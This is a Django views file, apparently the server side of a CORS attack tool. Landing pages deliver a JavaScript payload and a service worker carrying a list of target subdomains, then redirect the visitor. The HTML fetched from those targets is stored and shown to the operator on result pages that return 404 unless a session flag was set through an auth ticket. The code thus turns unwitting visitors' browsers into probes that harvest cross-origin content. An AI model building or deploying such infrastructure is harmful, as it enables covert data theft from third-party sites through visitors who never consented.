from functools import wraps
from typing import Any, Callable, Final, Optional
from uuid import UUID

from django.conf import settings
from django.core.exceptions import SuspiciousOperation
from django.http import Http404, HttpRequest, HttpResponse
from django.shortcuts import render
from django.utils.decorators import method_decorator
from django.views.decorators.cache import never_cache

from web.logic.auth import AuthManager
from web.logic.targets import TargetManager
from web.models.result import CORSRequestResult
from web.models.target import HostDomain
from web.util.filters import CORSRequestResultFilter
from web.util.request import get_redirect_target_from_request, get_request_host
from web.util.tables import CORSRequestResultTable, FilteredSingleTableView

SESSION_AUTH_KEY: Final[str] = "AUTHED"


def requires_auth(fn: Callable) -> Callable:
    """Custom view decorator that will hide any protected pages if the SESSION_AUTH_KEY defined above
    is not found in the requesting user's session.
    """

    @wraps(fn)
    def wrap(request: HttpRequest, *args: Any, **kwargs: Any) -> Any:
        if not request.session.get(SESSION_AUTH_KEY):
            raise Http404()
        return fn(request, *args, **kwargs)

    return wrap


def _should_render_for_host(request: HttpRequest) -> tuple[bool, Optional[HostDomain]]:
    """Test to see whether a page should be rendered based on the contents of the given request. If it
    should be rendered then return the corresponding HostDomain record to render from.
    """
    host = get_request_host(request=request)
    match_found, match = TargetManager.find_host_domain_for_requested_host(
        requested_host=host
    )
    if not match_found:
        return False, None
    assert match is not None
    subdomain_count = TargetManager.get_active_target_subdomains_for_host_domain(
        host_domain=match.domain
    ).count()
    if subdomain_count == 0:
        return False, None
    return True, match


def _get_js_context_for_request(
    request: HttpRequest,
    host_domain: HostDomain,
    include_payload_targets: bool = False,
    auto_invoke: bool = True,
    redirect_ms: int = settings.JS_REDIRECT_MS,
    print_debug: bool = settings.DEBUG,
) -> dict[str, Any]:
    """Get the template rendering context for the JS payload from the given request and matching
    host domain.
    """
    to_return = {
        "redirect_url": get_redirect_target_from_request(
            request=request,
            from_domain=host_domain.domain,
            to_domain=host_domain.redirect_domain,
        ),
        "redirect_ms": redirect_ms,
        "auto_invoke": auto_invoke,
        "print_debug": print_debug,
    }
    if include_payload_targets:
        to_return[
            "payload_targets"
        ] = TargetManager.get_active_target_subdomains_for_host_domain(
            host_domain=host_domain.domain
        )
    return to_return


def landing(request: HttpRequest) -> HttpResponse:
    """Attempt to serve up a landing page for a host domain as configured within the backing database.
    If the request is to a domain that we do not have configured as a host domain then we simply return
    a 404 not found.
    """
    should_render, _ = _should_render_for_host(request=request)
    if not should_render:
        raise Http404()
    return render(
        request=request,
        template_name="web/landing_sw.html",
        context={},
    )


def landing_debug(request: HttpRequest) -> HttpResponse:
    """Attempt to serve up a debugging landing page for a host domain as configured within the
    backing database. This debugging version is configured to run all of the CORS testing on the page
    that is loaded rather than kicking off in a service worker and redirecting. Thus this is an easier
    method for testing the proper configuration. If the request is to a domain that we do not have
    configured as a host domain then we simply return a 404 not found."""
    should_render, host_domain = _should_render_for_host(request=request)
    if not should_render:
        raise Http404()
    assert host_domain is not None
    return render(
        request=request,
        template_name="web/landing_debug.html",
        context=_get_js_context_for_request(
            request=request,
            host_domain=host_domain,
            auto_invoke=False,
            include_payload_targets=True,
        ),
    )


@never_cache
def landing_js_payload(request: HttpRequest) -> HttpResponse:
    """Render and serve up the initial landing JS payload if the requested host is valid. If the
    requested host is not valid then issue a 404.
    """
    should_render, host_domain = _should_render_for_host(request=request)
    if not should_render:
        raise Http404()
    assert host_domain is not None
    return render(
        request=request,
        template_name="web/landing.js",
        context=_get_js_context_for_request(request=request, host_domain=host_domain),
        content_type="text/javascript;charset=UTF-8",
    )


@never_cache
def sw_js_payload(request: HttpRequest) -> HttpResponse:
    """Render and serve up the service worker JS payload if the requested host is valid. If the requested
    host is not valid then issue a 404.
    """
    should_render, host_domain = _should_render_for_host(request=request)
    if not should_render:
        raise Http404()
    assert host_domain is not None
    return render(
        request=request,
        template_name="web/sw.js",
        context=_get_js_context_for_request(
            request=request, host_domain=host_domain, include_payload_targets=True
        ),
        content_type="text/javascript;charset=UTF-8",
    )


@method_decorator(requires_auth, name="dispatch")
class CORSRequestResultListView(FilteredSingleTableView):
    """Page for viewing all of the CORSRequestResult objects sitting in the database."""

    model = CORSRequestResult
    table_class = CORSRequestResultTable
    template_name = "web/generic_table.html"
    filterset_class = CORSRequestResultFilter

    def get_context_data(self, **kwargs: Any) -> dict[str, Any]:
        to_return = super().get_context_data(**kwargs)
        to_return["title"] = "CORS Scan Results"
        return to_return


@requires_auth
def view_html_content(request: HttpRequest, result_id: int) -> HttpResponse:
    """Render a page that displays the HTML content from the referenced CORSRequestResult record."""
    try:
        record = CORSRequestResult.objects.get(id=result_id)
    except CORSRequestResult.DoesNotExist:
        raise Http404()
    if not record.success:
        raise SuspiciousOperation(
            "That record was not successful (ie: fetch did not retrieve HTML)."
        )
    if not record.content:
        raise SuspiciousOperation(
            "That record does not have HTML content for some reason..."
        )
    return render(
        request=request,
        template_name="web/show_html_content.html",
        context={
            "record": record,
        },
    )


def consume_auth_ticket(request: HttpRequest, ticket_guid: UUID) -> HttpResponse:
    """Attempt to consume the auth ticket referenced by the given GUID. If successful redirect to the
    results viewing page.
    """
    if not AuthManager.use_auth_ticket(guid=ticket_guid):
        raise SuspiciousOperation("Invalid ticket")
    request.session[SESSION_AUTH_KEY] = True
    return HttpResponse("Hello World")
